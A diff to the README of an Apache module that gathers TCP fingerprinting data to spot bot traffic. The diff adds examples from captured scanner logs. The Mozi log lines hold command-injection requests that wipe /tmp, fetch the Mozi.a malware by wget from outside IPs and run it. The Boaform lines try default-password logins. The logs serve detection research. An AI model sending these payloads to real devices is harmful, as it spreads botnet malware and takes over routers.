@@ -4,10 +4,6 @@ A module that retrieves connection tcp fingerprinting data from the Linux kernel
 
 This module will instruct the kernel to SAVE_SYN on all apache Listen sockets (all incoming connections). In some cases the kernel does not preserve SYN packets--ex. if a SYN flood causes SYN cookies to be used. 
 
-## Progress
-
-This module should be ready for testing, broader use.
-
 ## Installation/Usage
 
 To use this module, compile and install.
@@ -62,7 +58,48 @@ Timestamp
  - connection accept time - ~~FINGERPRINT_ACCEPT_TIME~~
    - Not currently implemented, unable to get actual connection establishment time using existing hooks
 
-### Potential Future Work
+## Motivation/Examples
+
+TCP Fingerprinting is useful for many applications, here we show two simple examples using common botnet propagation patterns collected by observing natural internet scanning from a single IP. 
+
+These examples are the simplest, noisiest examples. However, this type of analysis isn't limited to detecting mere internet scanning noise, many residential proxy botnets can be detected using similar hueristics. More advanced detections are possible. 
+
+We show that it's easy and efficient to collect this information at the request level. Cloud providers--please give us the option to get this sort of information for our tenants!
+
+The following fields are shown in these examples:
+
+```
+%{FINGERPRINT_TCP_RTT}g %{FINGERPRINT_IP_TTL}g %{FINGERPRINT_TCP_WSIZE}g %{FINGERPRINT_TCP_WSCALE}g %{FINGERPRINT_TCP_OPTIONS}g %{FINGERPRINT_TCP_MSS}g \"%r\"
+```
+
+### Mozi
+```
+2180970 50 28800 4 2,4,8,1,3 1406 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://45.164.178.64:10368/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
+4020319 49 29040 5 2,4,8,1,3 1452 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://119.117.156.111:43636/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
+ 563328 49 29040 5 2,4,8,1,3 1400 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://115.63.48.207:54752/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
+1097078 45  5808 1 2,4,8,1,3 1452 "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://102.33.37.29:41084/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
+```
+### Boaform
+```
+2629368 50 28800 4 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
+3608747 47  5808 5 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
+4969075 44  5808 2 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
+ 454541 49 29040 5 2,4,8,1,3 1400 "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
+3019585 49  5808 5 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
+2423828 49 28800 4 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
+3114062 45  5808 2 2,4,8,1,3 1452 "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
+2260885 49 28800 4 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
+2549609 49 28800 5 2,4,8,1,3 1406 "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
+```
+### Observations
+
+These devices can be identified as Linux using TCP options, TTL < 64, and window size that is usually a function of MSS (note specific MSS/window size pairs).
+
+The requests can all be identified as embedded linux using windows scale. For many of the versions of linux seen on these types of devices, when memory is low (~<2GB) then window scale is based indirectly on memory size. All of the above requests appear to originate from embedded linux devices such as routers, modems, IoT devices, etc. In most environments it would be acceptable to simply block or otherwise considering as fradulent any linux traffic with window scale <= 5.
+
+The RTTs observed are extremely high--this is likely an artifact of limited processor power/slow scanning software rather than signal propogation delay.
+
+## Potential Future Work
 
 Implement TCP handshake RTT calculation. RFC on methods for getting handshake RTT (delta between SYN and first ACK) or accurate connection establishment timestamp from module.
 
@@ -76,7 +113,7 @@ More TCP_INFO attributes: Option to collect the whole TCP_INFO struct available 
 
 Configuration directive to configure SAVE_SYN on a per Listen basis. RFC on what this should look like.
 
-### Tasks
+## Tasks
 
  - ~~basic module skeleton~~
  - ~~Collect TCP_INFO~~
@@ -135,23 +172,23 @@ Configuration directive to configure SAVE_SYN on a per Listen basis. RFC on what
      - yara
    - Possibly use database to block unwanted connections
 
-### References:
+## References:
 
-#### netlink
+### netlink
 
 https://www.kernel.org/doc/html/next/userspace-api/netlink/intro.html
 
 https://blog.mygraphql.com/en/notes/low-tec/network/tcp-inspect/#rationale---how-ss-work
 
-#### Relevant Apache module development example
+### Relevant Apache module development example
 
 https://www.tirasa.net/en/blog/developing-custom-apache2-module
 
-#### Linux SYN handling (when SAVED_SYN is available)
+### Linux SYN handling (when SAVED_SYN is available)
 
 https://blog.cloudflare.com/syn-packet-handling-in-the-wild/
 
-#### Linux kernel TCP_INFO
+### Linux kernel TCP_INFO
 
 https://www.youtube.com/watch?v=ZUihWPyt_zo&t=1994s
 
